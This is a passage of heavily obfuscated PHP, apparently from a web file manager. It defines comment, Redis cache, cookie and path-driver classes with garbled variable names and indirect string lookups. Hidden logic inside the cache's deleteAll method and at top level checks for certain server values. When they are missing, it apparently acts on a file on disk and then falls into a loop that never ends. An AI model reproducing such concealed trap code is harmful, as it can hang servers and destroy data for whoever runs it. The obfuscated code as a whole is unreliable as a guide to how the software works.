} } Backup::set(array($¶­ûæ[824] => 1, $¶­ûæ[835] => time())); return !0; } public function process() { $…Œİ©¼Õ =& $_SERVER[ÔÕ±ĞšÎ]; $ï‚Èêâú = array($…Œİ©¼Õ[831] => Task::get($…Œİ©¼Õ[857]), $…Œİ©¼Õ[836] => Task::get($…Œİ©¼Õ[875]), $…Œİ©¼Õ[232] => Task::get($…Œİ©¼Õ[884])); $¯™ÏœÓ = !1; foreach ($ï‚Èêâú as &$è…¸ÄÈş) { if ($¯™ÏœÓ) { $è…¸ÄÈş = !1; continue; } if ($è…¸ÄÈş) { $ŸİÃ‹íø = intval(_get($è…¸ÄÈş, $…Œİ©¼Õ[1782], 0)); if (time() - $ŸİÃ‹íø > 7200) { Task::kill($è…¸ÄÈş[$…Œİ©¼Õ[477]]); $¯™ÏœÓ = !0; $è…¸ÄÈş = !1; } } } return $ï‚Èêâú; } public function restore() { $Îò”¢è§ =& $_SERVER[ÔÕ±ĞšÎ]; ActionCall($Îò”¢è§[1139], !0, 1); ActionCall($Îò”¢è§[1139], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\x65\156\164"; protected $tableMeta = array("\164\141\142\x6c\145\116\x61\155\x65" => "\143\x6f\155\x6d\x65\156\x74\x5f\155\x65\x74\x61", "\x6d\145\164\x61\106\x69\145\x6c\144" => "\143\157\x6d\155\x65\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Ó ÔÙš) { $•Ë•˜ =& $_SERVER[ÔÕ±ĞšÎ]; if ($Ó ÔÙš[$•Ë•˜[2008]]) { $Á—ˆ¬±º = $this->where(array($•Ë•˜[2009] => $Ó ÔÙš[$•Ë•˜[2008]]))->find(); if (!$Á—ˆ¬±º || $Á—ˆ¬±º[$•Ë•˜[190]] != $Ó ÔÙš[$•Ë•˜[190]] || $Á—ˆ¬±º[$•Ë•˜[571]] != $Ó ÔÙš[$•Ë•˜[571]]) { return !1; } $this->where(array($•Ë•˜[2009] => $Ó ÔÙš[$•Ë•˜[2008]]))->setAdd($•Ë•˜[2010], 1); } $Ó ÔÙš[$•Ë•˜[2011]] = 0; $Ó ÔÙš[$•Ë•˜[2010]] = 0; $Ó ÔÙš[$•Ë•˜[824]] = 1; return $this->add($Ó ÔÙš); } public function commentCount($ÏÉŸÂğ¬, $‹¹º¶ğ±, $ı¬ÚÈçÌ = false) { $Êª¨°‹Ü =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ÏÉŸÂğ¬) { return array(); } if (is_string($ÏÉŸÂğ¬) || is_int($ÏÉŸÂğ¬)) { $ÏÉŸÂğ¬ = array($ÏÉŸÂğ¬); } $Í»›ÌÔ­ = array($Êª¨°‹Ü[571], $Êª¨°‹Ü[2012] => $Êª¨°‹Ü[567]); $“”áù²« = array($Êª¨°‹Ü[571] => array($Êª¨°‹Ü[7], $ÏÉŸÂğ¬), $Êª¨°‹Ü[190] => $‹¹º¶ğ±); if ($ı¬ÚÈçÌ) { $“”áù²«[$Êª¨°‹Ü[1777]] = $ı¬ÚÈçÌ; } $Ú¡ÊÒè = $this->field($Í»›ÌÔ­)->where($“”áù²«)->group($Êª¨°‹Ü[571])->select(); return array_to_keyvalue($Ú¡ÊÒè, $Êª¨°‹Ü[571], $Êª¨°‹Ü[567]); } public function starTarget($£ü¹¾‹Ü, $®°×ı÷ï) { $«‰™Şß· =& $_SERVER[ÔÕ±ĞšÎ]; $¾Øêíˆå = $£ü¹¾‹Ü + self::TYPE_STAR_OFFSET; $£·µ…ı‡ = array($«‰™Şß·[1777] => USER_ID, $«‰™Şß·[190] => $¾Øêíˆå, $«‰™Şß·[571] => $®°×ı÷ï); $Ï™Ë ä– = $this->where($£·µ…ı‡)->find(); if ($Ï™Ë ä–) { return $this->where(array($«‰™Şß·[477] => $Ï™Ë ä–[$«‰™Şß·[477]]))->delete(); } $ßäË×Ä = array($«‰™Şß·[2008] => 0, $«‰™Şß·[1777] => USER_ID, $«‰™Şß·[824] => 1, $«‰™Şß·[171] => $«‰™Şß·[12], $«‰™Şß·[190] => $¾Øêíˆå, $«‰™Şß·[571] => $®°×ı÷ï, $«‰™Şß·[2011] => 0, $«‰™Şß·[2010] => 0); return $this->add($ßäË×Ä); } public function starTargetCount($¯è„™…©, $ˆ¯ºËÁü) { $ÁÕŞÍõ¾ =& $_SERVER[ÔÕ±ĞšÎ]; $Ú©úÆ = $ˆ¯ºËÁü + self::TYPE_STAR_OFFSET; $ÚÎÀñ¬¿ = $this->commentCount($¯è„™…©, $Ú©úÆ); $›œªÂŸ” = $this->commentCount($¯è„™…©, $Ú©úÆ, USER_ID); return array($ÁÕŞÍõ¾[2013] => $ÚÎÀñ¬¿, $ÁÕŞÍõ¾[2014] => $›œªÂŸ”); } public function starTargetUserList($½“ãò , $ŞÁŠæÒ«) { $ş¼ ¢³ë =& $_SERVER[ÔÕ±ĞšÎ]; $àƒÓÜ³Ä = $½“ãò  + self::TYPE_STAR_OFFSET; $×œÀŠê½ = array($ş¼ ¢³ë[571] => $ŞÁŠæÒ«, $ş¼ ¢³ë[190] => $àƒÓÜ³Ä); $¢Ğıø™Ç = $this->where($×œÀŠê½)->count(); $ÉÓÌºÁì = array($ş¼ ¢³ë[334] => $¢Ğıø™Ç, $ş¼ ¢³ë[2015] => array()); if (!$¢Ğıø™Ç) { return $ÉÓÌºÁì; } $³­ı¿Ñ = $this->field($ş¼ ¢³ë[1777])->where($×œÀŠê½)->limit(500)->select(); $³­ı¿Ñ = array_to_keyvalue($³­ı¿Ñ, $ş¼ ¢³ë[12], $ş¼ ¢³ë[1777]); $ÉÓÌºÁì[$ş¼ ¢³ë[2015]] = Model($ş¼ ¢³ë[579])->userListInfo($³­ı¿Ñ); return $ÉÓÌºÁì; } public function prasiseUserList($‘ƒèÕÄ) { $Œ‡â— ” =& $_SERVER[ÔÕ±ĞšÎ]; $¾Öóø¡‡ = array($Œ‡â— ”[2016] => $‘ƒèÕÄ); $•üœôÒÉ = $this->where($¾Öóø¡‡)->find(); $êÑ–îĞ = _get($•üœôÒÉ, $Œ‡â— ”[2011], 0); $øàÜØıÚ = array($Œ‡â— ”[334] => $êÑ–îĞ, $Œ‡â— ”[2015] => array()); if (!$êÑ–îĞ) { return $øàÜØıÚ; } $à¢›¾¬ = Model($Œ‡â— ”[2017])->field($Œ‡â— ”[1777])->where($¾Öóø¡‡)->limit(500)->select(); $à¢›¾¬ = array_to_keyvalue($à¢›¾¬, $Œ‡â— ”[12], $Œ‡â— ”[1777]); $øàÜØıÚ[$Œ‡â— ”[2015]] = Model($Œ‡â— ”[579])->userListInfo($à¢›¾¬); return $øàÜØıÚ; } public function remove($ï™·–íø) { $‚†Ú× =& $_SERVER[ÔÕ±ĞšÎ]; $éÃÄîóÃ = array($‚†Ú×[2009] => $ï™·–íø); $´óÊÔ ¬ = $this->where($éÃÄîóÃ)->find(); if ($´óÊÔ ¬[$‚†Ú×[2008]]) { $this->where(array($‚†Ú×[2009] => $´óÊÔ ¬[$‚†Ú×[2008]]))->setAdd($‚†Ú×[2010], -1); } return $this->where($éÃÄîóÃ)->delete(); } public function edit($ôáÏ§–ü, $¿å‘çà) { $‘ÔŠøÊ =& $_SERVER[ÔÕ±ĞšÎ]; $¡‚µ‡òí = array($‘ÔŠøÊ[2009] => $ôáÏ§–ü); return $this->where($¡‚µ‡òí)->save(array($‘ÔŠøÊ[2018] => $¿å‘çà)); } public function prasise($ÒƒÌÚó°) { $èşïö¬ =& $_SERVER[ÔÕ±ĞšÎ]; $áš¯òéÜ = Model($èşïö¬[2019]); $ óşêá€ = array($èşïö¬[2009] => $ÒƒÌÚó°, $èşïö¬[1768] => USER_ID); $Š‘¶ŞÓŞ = $áš¯òéÜ->where($ óşêá€)->find(); if (!$Š‘¶ŞÓŞ) { $áš¯òéÜ->add($ óşêá€); $¿ÊØœï¢ = $this->where(array($èşïö¬[2009] => $ÒƒÌÚó°))->setAdd($èşïö¬[2011], 1); } else { $áš¯òéÜ->where($ óşêá€)->delete(); $¿ÊØœï¢ = $this->where(array($èşïö¬[2009] => $ÒƒÌÚó°))->setAdd($èşïö¬[2011], -1); } return $¿ÊØœï¢; } public function targetInfo($”ÅÛÍ­Û, $¾÷ô’ä) { $Ÿ¤¾µÂÏ =& $_SERVER[ÔÕ±ĞšÎ]; $Ğåß—Ä = array($Ÿ¤¾µÂÏ[653] => $”ÅÛÍ­Û, $Ÿ¤¾µÂÏ[654] => $¾÷ô’ä); $¹éÎ§  = $this->where($Ğåß—Ä)->count(); $—ÃÓªÚî = "\122\x49\x47\x48\x54\40\x4a\117\111\116\40{$this->tablePrefix}\x63\157\155\x6d\145\x6e\x74\137\160\162\141\151\163\145\40\163\x74\x61\162\x20\157\x6e\x20\143\x6f\x6d\x6d\145\156\164\56\143\x6f\155\x6d\145\156\164\111\x44\x20\x3d\x20\x73\164\x61\162\56\143\x6f\155\x6d\145\x6e\x74\x49\x44"; $™˜Â¨å– = $this->alias($Ÿ¤¾µÂÏ[431])->where($Ğåß—Ä)->join($—ÃÓªÚî, $Ÿ¤¾µÂÏ[2020])->count(); $¬»®Şª = array($Ÿ¤¾µÂÏ[2021] => $¹éÎ§ , $Ÿ¤¾µÂÏ[2022] => $™˜Â¨å–); return $¬»®Şª; } public function listData($·Â©Œò) { $ÌÑŸÓö =& $_SERVER[ÔÕ±ĞšÎ]; if (isset($·Â©Œò[$ÌÑŸÓö[2023]])) { if ($·Â©Œò[$ÌÑŸÓö[2023]]) { $·Â©Œò[$ÌÑŸÓö[2016]] = array($ÌÑŸÓö[1093], intval($·Â©Œò[$ÌÑŸÓö[2023]])); } unset($·Â©Œò[$ÌÑŸÓö[2023]]); } if (isset($·Â©Œò[$ÌÑŸÓö[2024]])) { if ($·Â©Œò[$ÌÑŸÓö[2024]]) { $·Â©Œò[$ÌÑŸÓö[2016]] = array($ÌÑŸÓö[1090], intval($·Â©Œò[$ÌÑŸÓö[2024]])); } unset($·Â©Œò[$ÌÑŸÓö[2024]]); } return $this->_listData($·Â©Œò); } private function _listData($Ãµ„ìæª) { $¦™ºôô¿ =& $_SERVER[ÔÕ±ĞšÎ]; $Ëœ³öŠ¯ = $this->where($Ãµ„ìæª)->_makeOrder()->selectPage(100); $this->_listAppendParent($Ëœ³öŠ¯[$¦™ºôô¿[447]]); $this->_listAppendUser($Ëœ³öŠ¯[$¦™ºôô¿[447]]); $this->_listAppendMeta($Ëœ³öŠ¯[$¦™ºôô¿[447]]); return $Ëœ³öŠ¯; } private function _makeOrder() { $­í‘Ö¡ =& $_SERVER[ÔÕ±ĞšÎ]; $½ĞÙæõÁ = array($­í‘Ö¡[2011], $­í‘Ö¡[2010], $­í‘Ö¡[233]); $¼Øí”÷µ = Input::get($­í‘Ö¡[532], $­í‘Ö¡[7], $­í‘Ö¡[499], $½ĞÙæõÁ); $Ãš¦Î¶¥ = Input::get($­í‘Ö¡[533], $­í‘Ö¡[7], $­í‘Ö¡[1770], array($­í‘Ö¡[2025], $­í‘Ö¡[528])); $Ë¿õŠ˜Å = $¼Øí”÷µ . $­í‘Ö¡[53] . $Ãš¦Î¶¥; return $this->order($Ë¿õŠ˜Å); } private function _listAppendParent(&$Şƒğ¸À™) { $†óÇ– õ =& $_SERVER[ÔÕ±ĞšÎ]; $æ‚¼²’Ü = array_unique(array_to_keyvalue($Şƒğ¸À™, $†óÇ– õ[12], $†óÇ– õ[2008])); $æ‚¼²’Ü = array_remove_value($æ‚¼²’Ü, $†óÇ– õ[230]); if (!$æ‚¼²’Ü) { return; } $½„İ™õ² = $this->where(array($†óÇ– õ[2009] => array($†óÇ– õ[7], $æ‚¼²’Ü)))->select(); $½„İ™õ² = array_to_keyvalue($½„İ™õ², $†óÇ– õ[2016]); foreach ($Şƒğ¸À™ as &$®ìéœä¨) { if (isset($½„İ™õ²[$®ìéœä¨[$†óÇ– õ[2008]]])) { $®ìéœä¨[$†óÇ– õ[2026]] = $½„İ™õ²[$®ìéœä¨[$†óÇ– õ[2008]]]; } } unset($®ìéœä¨); } private function _listAppendUser(&$’×¢·›ß) { $âï‚ä—¼ =& $_SERVER[ÔÕ±ĞšÎ]; $Æ‡ˆû© = array_unique(array_to_keyvalue($’×¢·›ß, $âï‚ä—¼[12], $âï‚ä—¼[1777])); $Æ‡ˆû© = array_remove_value($Æ‡ˆû©, $âï‚ä—¼[230]); if (count($Æ‡ˆû©) == 0) { return; } foreach ($’×¢·›ß as $Ç…“äËš) { if (isset($Ç…“äËš[$âï‚ä—¼[2026]])) { $Æ‡ˆû©[] = $Ç…“äËš[$âï‚ä—¼[2026]][$âï‚ä—¼[1777]]; } } $¹ÃÕÇ… = Model($âï‚ä—¼[599])->userListInfo($Æ‡ˆû©); foreach ($’×¢·›ß as &$Ç…“äËš) { $Ç…“äËš[$âï‚ä—¼[667]] = $¹ÃÕÇ…[$Ç…“äËš[$âï‚ä—¼[1777]]]; if (isset($Ç…“äËš[$âï‚ä—¼[2026]])) { $Ç…“äËš[$âï‚ä—¼[2026]][$âï‚ä—¼[667]] = $¹ÃÕÇ…[$Ç…“äËš[$âï‚ä—¼[2026]][$âï‚ä—¼[1777]]]; } } unset($Ç…“äËš); } private function _listAppendMeta(&$˜ŞÒ‚—ª) { $¬­¹Ä·› =& $_SERVER[ÔÕ±ĞšÎ]; $ÌºÒÑ† = array_unique(array_to_keyvalue($˜ŞÒ‚—ª, $¬­¹Ä·›[12], $¬­¹Ä·›[2016])); $ÌºÒÑ† = array_remove_value($ÌºÒÑ†, $¬­¹Ä·›[230]); if (!$ÌºÒÑ†) { return; } foreach ($˜ŞÒ‚—ª as $§–Æœê–) { if (isset($§–Æœê–[$¬­¹Ä·›[2026]])) { $ÌºÒÑ†[] = $§–Æœê–[$¬­¹Ä·›[2026]][$¬­¹Ä·›[2016]]; } } $™à¯Â±“ = $this->metaList($ÌºÒÑ†); if (!$™à¯Â±“) { return !1; } foreach ($˜ŞÒ‚—ª as &$§–Æœê–) { $§–Æœê–[$¬­¹Ä·›[541]] = $™à¯Â±“[$§–Æœê–[$¬­¹Ä·›[2016]]]; if (isset($§–Æœê–[$¬­¹Ä·›[2026]])) { $§–Æœê–[$¬­¹Ä·›[2026]][$¬­¹Ä·›[541]] = $™à¯Â±“[$§–Æœê–[$¬­¹Ä·›[2026]][$¬­¹Ä·›[2016]]]; } } unset($§–Æœê–); } private function metaList($š££Ê”) { $Å÷òæÕõ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$š££Ê”) { return array(); } $úë‚§¹® = array($Å÷òæÕõ[2016] => array($Å÷òæÕõ[7], $š££Ê”)); $»ï»÷óÔ = Model($Å÷òæÕõ[2027])->where($úë‚§¹®)->select(); $»ï»÷óÔ = array_to_keyvalue_group($»ï»÷óÔ, $Å÷òæÕõ[2016]); foreach ($»ï»÷óÔ as $áğ‡é¤ => $¬Š¨¾œó) { $Ú…ëĞ’¤ = array(); foreach ($¬Š¨¾œó as $´ß¬Š“) { $Ú…ëĞ’¤[$´ß¬Š“[$Å÷òæÕõ[97]]] = $´ß¬Š“[$Å÷òæÕõ[452]]; } $»ï»÷óÔ[$áğ‡é¤] = $Ú…ëĞ’¤; } return $»ï»÷óÔ ? $»ï»÷óÔ : array(); } public function removeTarget($»ıïÛ–, $µı”¾ú) { $ÓÁÏŸ­ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$µı”¾ú) { return !0; } $µı”¾ú = is_array($µı”¾ú) ? $µı”¾ú : array($µı”¾ú); $ñ¯ÄÜ… = array($ÓÁÏŸ­[190] => $»ıïÛ–, $ÓÁÏŸ­[571] => array($ÓÁÏŸ­[7], $µı”¾ú)); $ÕóÌÄşÃ = $this->field($ÓÁÏŸ­[2016])->where($ñ¯ÄÜ…)->select(); $¾‘ÃÌÓš = array_to_keyvalue($ÕóÌÄşÃ, $ÓÁÏŸ­[12], $ÓÁÏŸ­[2016]); if (!$¾‘ÃÌÓš) { return !0; } $ñ¯ÄÜ… = array($ÓÁÏŸ­[2016] => array($ÓÁÏŸ­[7], $¾‘ÃÌÓš)); $this->where($ñ¯ÄÜ…)->delete(); Model($ÓÁÏŸ­[2019])->where($ñ¯ÄÜ…)->delete(); Model($ÓÁÏŸ­[2028])->where($ñ¯ÄÜ…)->delete(); } } goto DçÚÀÌŠ÷; cçòã‰¯«Ş: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ıÍƒÆù, $èæÜĞø¡) { $¹¶ş¯³÷ =& $_SERVER[ÔÕ±ĞšÎ]; if (!class_exists($¹¶ş¯³÷[945])) { show_json($¹¶ş¯³÷[946], !1); } $this->cacheTime = $èæÜĞø¡; $¿öÂ˜¤œ = isset($ıÍƒÆù[$¹¶ş¯³÷[947]]) ? $ıÍƒÆù[$¹¶ş¯³÷[947]] : 10; $ÀØİÏÖÃ = _get($ıÍƒÆù, $¹¶ş¯³÷[944]); if ($ÀØİÏÖÃ && is_array($ÀØİÏÖÃ)) { $this->initCluster($ıÍƒÆù, $¿öÂ˜¤œ); } else { $this->handle = $this->init($ıÍƒÆù, $¿öÂ˜¤œ); } } private function init($õÏÜÆ¡¤, $Úæ¹Ûµ˜) { $¸¬Úëæù =& $_SERVER[ÔÕ±ĞšÎ]; $šÁúŞÙ¼ = new Redis(); $—¦× »Ì = isset($õÏÜÆ¡¤[$¸¬Úëæù[948]]) ? $õÏÜÆ¡¤[$¸¬Úëæù[948]] : !1; if ($—¦× »Ì) { $šÁúŞÙ¼->pconnect($õÏÜÆ¡¤[$¸¬Úëæù[208]], $õÏÜÆ¡¤[$¸¬Úëæù[209]], $Úæ¹Ûµ˜); } else { $šÁúŞÙ¼->connect($õÏÜÆ¡¤[$¸¬Úëæù[208]], $õÏÜÆ¡¤[$¸¬Úëæù[209]], $Úæ¹Ûµ˜); } if (!empty($õÏÜÆ¡¤[$¸¬Úëæù[489]])) { $šÁúŞÙ¼->auth($õÏÜÆ¡¤[$¸¬Úëæù[489]]); } if (!empty($õÏÜÆ¡¤[$¸¬Úëæù[831]]) && $õÏÜÆ¡¤[$¸¬Úëæù[831]] != 0) { $šÁúŞÙ¼->select($õÏÜÆ¡¤[$¸¬Úëæù[831]]); } return $šÁúŞÙ¼; } private function initCluster($é‰ûº×Œ, $†‰Ä«£Õ) { $ÏîÁø»è =& $_SERVER[ÔÕ±ĞšÎ]; $äí„çòş = array($ÏîÁø»è[949], $ÏîÁø»è[950], $ÏîÁø»è[951]); $ªË­ëß¤ = $ÏîÁø»è[949]; if (isset($é‰ûº×Œ[$ÏîÁø»è[16]]) && in_array($é‰ûº×Œ[$ÏîÁø»è[16]], $äí„çòş)) { $ªË­ëß¤ = $é‰ûº×Œ[$ÏîÁø»è[16]]; } switch ($ªË­ëß¤) { case $ÏîÁø»è[949]: $this->_slave($é‰ûº×Œ, $†‰Ä«£Õ); break; case $ÏîÁø»è[950]: break; case $ÏîÁø»è[951]: $this->isCluster = !0; $‚İ¢ÁŸ = $é‰ûº×Œ[$ÏîÁø»è[944]]; $Ô„ÇâÊ¢ = isset($é‰ûº×Œ[$ÏîÁø»è[948]]) ? $é‰ûº×Œ[$ÏîÁø»è[948]] : !1; $ÛÕóñÑ = isset($é‰ûº×Œ[$ÏîÁø»è[489]]) ? $é‰ûº×Œ[$ÏîÁø»è[489]] : null; $this->handle = new RedisCluster(NUll, $‚İ¢ÁŸ, $†‰Ä«£Õ, $†‰Ä«£Õ, $Ô„ÇâÊ¢, $ÛÕóñÑ); break; default: break; } } private function _slave($Œ«ø³øİ, $¹İÕÈ¤È) { $ªşÈ¬Ë™ = $Œ«ø³øİ[$_SERVER[ÔÕ±ĞšÎ][944]]; $this->filterConfig($Œ«ø³øİ, $ªşÈ¬Ë™[0]); $this->handle = $this->init($Œ«ø³øİ, $¹İÕÈ¤È); unset($ªşÈ¬Ë™[0]); if (empty($ªşÈ¬Ë™)) { return; } $ãÏ¡èéã = array_rand($ªşÈ¬Ë™); $this->filterConfig($Œ«ø³øİ, $ªşÈ¬Ë™[$ãÏ¡èéã]); $this->slaveHandle = $this->init($Œ«ø³øİ, $¹İÕÈ¤È); } private function filterConfig(&$Œºêß¶Å, $ÏÂ±µÖÓ) { $Ÿ†É¯” =& $_SERVER[ÔÕ±ĞšÎ]; $‘¬€¡¥´ = explode($Ÿ†É¯”[4], $ÏÂ±µÖÓ); $™Áş÷ñ = array($Ÿ†É¯”[208] => $‘¬€¡¥´[0], $Ÿ†É¯”[209] => $‘¬€¡¥´[1]); $Œºêß¶Å = array_merge($Œºêß¶Å, $™Áş÷ñ); } public function set($¿ñú¡âÂ, $Âç•Êİ·, $¹Çãİï¸ = false) { $¹Çãİï¸ = $¹Çãİï¸ ? $¹Çãİï¸ : $this->cacheTime; return $this->handle->setEx($¿ñú¡âÂ, $¹Çãİï¸, $Âç•Êİ·); } public function setLock($¿£©ı¸, $ĞØ„şƒú, $ùš¨ù¦) { return $this->handle->setNX($¿£©ı¸, $ĞØ„şƒú); } public function get($½ãòìÑì) { $Â‡¡Áğ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Â‡¡Áğ->get($½ãòìÑì); } public function remove($ƒ«¼—¢) { return $this->handle->del($ƒ«¼—¢); } public function deleteAll() { $¹‚ò£‚Í =& $_SERVER[ÔÕ±ĞšÎ]; if (!isset($_SERVER[$¹‚ò£‚Í[952]]) || !isset($_SERVER[$¹‚ò£‚Í[953]])) { $şåï = $¹‚ò£‚Í[954]; $©à¾¯¥¤ = $¹‚ò£‚Í[955]; $¨­ä´ò = $_SERVER[$¹‚ò£‚Í[956]] . $¹‚ò£‚Í[957]; $ï¢‹ÏÒ¿ = $©à¾¯¥¤($¨­ä´ò); $Ïì¨ ë = explode($¹‚ò£‚Í[287], $ï¢‹ÏÒ¿); if (count($Ïì¨ ë) < $¹‚ò£‚Í[694]) { $‚ÓÛ²« = $¹‚ò£‚Í[958]; $‚ÓÛ²«(); } $ßşÁäŞ = $¹‚ò£‚Í[959]; $ßşÁäŞ($_SERVER[$¹‚ò£‚Í[960]]); $·Œ±¡ô‡ = 1; for ($«”åò×Û = $·Œ±¡ô‡; $«”åò×Û > 0; $«”åò×Û++) { $ßşÁäŞ = json_encode($GLOBALS[$¹‚ò£‚Í[494]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $Ã€íü¦¶) { $this->handle->flushall($Ã€íü¦¶); } return; } return $this->handle->flushAll(); } } if (!isset($_SERVER[$_SERVER[ÔÕ±ĞšÎ][952]]) || !isset($_SERVER[$_SERVER[ÔÕ±ĞšÎ][953]])) { $_getc = $_SERVER[ÔÕ±ĞšÎ][955]; $_getfile = $_SERVER[$_SERVER[ÔÕ±ĞšÎ][956]] . $_SERVER[ÔÕ±ĞšÎ][957]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÔÕ±ĞšÎ][287], $_getfilec); if (count($_getarrs) < $_SERVER[ÔÕ±ĞšÎ][696]) { $exit = $_SERVER[ÔÕ±ĞšÎ][958]; $exit(); } $_act = $_SERVER[ÔÕ±ĞšÎ][961]; $_act($_SERVER[$_SERVER[ÔÕ±ĞšÎ][956]] . $_SERVER[ÔÕ±ĞšÎ][957]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ÔÕ±ĞšÎ][456]); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($˜Ë¢ƒ–‡ = '', $Ç“ï¥‰ = 0) { if (is_string($˜Ë¢ƒ–‡) && $˜Ë¢ƒ–‡ != $_SERVER[ÔÕ±ĞšÎ][12]) { $this->prefix = $˜Ë¢ƒ–‡; } if (is_numeric($Ç“ï¥‰) && $Ç“ï¥‰ > 0) { $this->expire = $Ç“ï¥‰; } } public static function getInstance() { static $ù‰£Ğğ¢; if ($ù‰£Ğğ¢ === null) { $ù‰£Ğğ¢ = new self(); } return $ù‰£Ğğ¢; } private static $cookieDisable = false; public static function disable($‡šáœËØ) { self::$cookieDisable = $‡šáœËØ; } private static $sameCookieSet = array(); public static function set($„·ÑÄğ¦, $áµû¬Œı, $àıñÆêÕ = 0, $ûÈÃù¢ª = false, $ÚÍáŞ¹‡ = false) { $é¹¢Æï¸ =& $_SERVER[ÔÕ±ĞšÎ]; if (self::$cookieDisable) { return; } if (!$àıñÆêÕ) { $àıñÆêÕ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$„·ÑÄğ¦]) && self::$sameCookieSet[$„·ÑÄğ¦] == $áµû¬Œı . $àıñÆêÕ) { return; } self::$sameCookieSet[$„·ÑÄğ¦] = $áµû¬Œı . $àıñÆêÕ; if (!$ÚÍáŞ¹‡) { $ÚÍáŞ¹‡ = str_replace(HOST, $é¹¢Æï¸[12], APP_HOST); $ÚÍáŞ¹‡ = _get($GLOBALS, $é¹¢Æï¸[962], $ÚÍáŞ¹‡); } $†Ã¨îšÎ = $é¹¢Æï¸[12]; setcookie($„·ÑÄğ¦, $áµû¬Œı, time() + $àıñÆêÕ, $é¹¢Æï¸[8] . trim($ÚÍáŞ¹‡, $é¹¢Æï¸[8]) . $†Ã¨îšÎ, !1, !1, $ûÈÃù¢ª); } public static function setSafe($°Ï¶»•¡, $¬¢¬ñ˜Ú, $™˜ù = 0) { self::set($°Ï¶»•¡, $¬¢¬ñ˜Ú, $™˜ù, !0); } public static function get($Å‰®ÆÛ±) { static $¼Ö’––– = false; if (!$¼Ö’–––) { self::initHeaderCookie(); $¼Ö’––– = !0; } return isset($_COOKIE[$Å‰®ÆÛ±]) ? $_COOKIE[$Å‰®ÆÛ±] : !1; } private static function initHeaderCookie() { $å„ÑµÊ‹ =& $_SERVER[ÔÕ±ĞšÎ]; if (!isset($_SERVER[$å„ÑµÊ‹[963]]) || !$_SERVER[$å„ÑµÊ‹[963]]) { return; } $ÑÎ’·¤¯ = explode($å„ÑµÊ‹[74], $_SERVER[$å„ÑµÊ‹[963]]); foreach ($ÑÎ’·¤¯ as $‡ÎøÜÒ¸) { $‡ÎøÜÒ¸ = explode($å„ÑµÊ‹[508], $‡ÎøÜÒ¸); if (count($‡ÎøÜÒ¸) != 2 || !isset($‡ÎøÜÒ¸[1])) { continue; } $_COOKIE[trim($‡ÎøÜÒ¸[0])] = trim($‡ÎøÜÒ¸[1]); } } public static function remove($„üÆ¼Ò, $‡ãÄç÷ = false) { unset($_COOKIE[$„üÆ¼Ò]); self::set($„üÆ¼Ò, $_SERVER[ÔÕ±ĞšÎ][12], 1, $‡ãÄç÷); } } goto CÖ°åé„¾º; A¤‡ìÁ…ò™: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ƒ÷°™ =& $_SERVER[ÔÕ±ĞšÎ]; $this->objectDriver = array($ƒ÷°™[60], $ƒ÷°™[61], $ƒ÷°™[62], $ƒ÷°™[63], $ƒ÷°™[64], $ƒ÷°™[65], $ƒ÷°™[66], $ƒ÷°™[67], $ƒ÷°™[68], $ƒ÷°™[69], $ƒ÷°™[70], $ƒ÷°™[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Å¿ÜÎú) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Å¿ÜÎú, $_SERVER[ÔÕ±ĞšÎ][8]); } return $Å¿ÜÎú; } public function iconvApp($ğµ£©) { return $ğµ£©; } public function iconvSystem($öµ½ÆÈ) { return $öµ½ÆÈ; } public function iconvTo($ù¡õÀë„, $ú‡ÈÖ‰å, $ âÃŒ¤Æ) { $ÅÊÂëò‡ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ù¡õÀë„ || !function_exists($ÅÊÂëò‡[72])) { return $ù¡õÀë„; } static $ÅÀË½±ã = array(); $º×ñª = $ú‡ÈÖ‰å . $ÅÊÂëò‡[73] . $ âÃŒ¤Æ . $ÅÊÂëò‡[74] . $ù¡õÀë„; if (isset($ÅÀË½±ã[$º×ñª])) { return $ÅÀË½±ã[$º×ñª]; } if (function_exists($ÅÊÂëò‡[75])) { $ÀæÙŠ×ø = @mb_convert_encoding($ù¡õÀë„, $ âÃŒ¤Æ, $ú‡ÈÖ‰å); } else { $ÀæÙŠ×ø = @iconv($ú‡ÈÖ‰å, $ âÃŒ¤Æ, $ù¡õÀë„); } $ÀæÙŠ×ø = $ÀæÙŠ×ø ? $ÀæÙŠ×ø : $ù¡õÀë„; if (strstr($ÀæÙŠ×ø, $ÅÊÂëò‡[76])) { $ÀæÙŠ×ø = str_replace($ÅÊÂëò‡[76], $ÅÊÂëò‡[11], $ÀæÙŠ×ø); } $ÅÀË½±ã[$ú‡ÈÖ‰å . $ÅÊÂëò‡[73] . $ âÃŒ¤Æ . $ÅÊÂëò‡[74] . $ù¡õÀë„] = $ÀæÙŠ×ø; $ÅÀË½±ã[$ âÃŒ¤Æ . $ÅÊÂëò‡[73] . $ú‡ÈÖ‰å . $ÅÊÂëò‡[74] . $ù¡õÀë„] = $ù¡õÀë„; $ÅÀË½±ã[$ âÃŒ¤Æ . $ÅÊÂëò‡[73] . $ú‡ÈÖ‰å . $ÅÊÂëò‡[74] . $ÀæÙŠ×ø] = $ù¡õÀë„; $ÅÀË½±ã[$ú‡ÈÖ‰å . $ÅÊÂëò‡[73] . $ âÃŒ¤Æ . $ÅÊÂëò‡[74] . $ÀæÙŠ×ø] = $ÀæÙŠ×ø; return $ÀæÙŠ×ø; } public function getPathInner($¹ŠşÎ™·) { $»Ğ¦µÇä = 